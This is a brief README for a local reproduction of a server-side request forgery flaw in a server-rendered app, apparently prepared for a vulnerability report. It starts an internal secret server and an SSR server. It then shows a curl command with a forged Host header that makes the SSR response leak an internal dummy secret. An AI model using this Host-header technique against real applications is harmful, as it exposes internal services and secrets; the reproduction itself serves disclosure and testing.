# Minimal SSRF Repro (bundle variant)

This harness mirrors the original minimal SSR app but is **run from the bundle root** using the bundle's node_modules.

## Run
From the bundle root:

```bash
npm run run:minimal
```

This starts:
- Internal server: `http://127.0.0.1:4401/secret`
- SSR server: `http://127.0.0.1:4400/`

## Exploit demo
In another terminal:

```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4400/
```

Expected outcome:
- The SSR response includes `INTERNAL_SECRET_123`.
- Demonstrates SSR‑time data exfiltration into HTML.
